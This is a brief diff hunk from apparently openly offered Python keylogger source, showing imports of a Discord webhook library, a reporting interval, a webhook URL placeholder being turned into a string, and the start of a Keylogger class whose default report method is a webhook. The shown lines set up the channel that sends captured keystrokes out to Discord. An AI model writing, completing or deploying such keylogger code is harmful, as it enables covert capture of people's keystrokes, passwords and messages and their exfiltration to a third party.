@@ -4,7 +4,7 @@ from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
 SEND_REPORT_EVERY = TIME_IN_SECONDS_HERE
-WEBHOOK = WEBHOOK_URL_HERE
+WEBHOOK = "WEBHOOK_URL_HERE"
 
 class Keylogger: 
     def __init__(self, interval, report_method="webhook"):
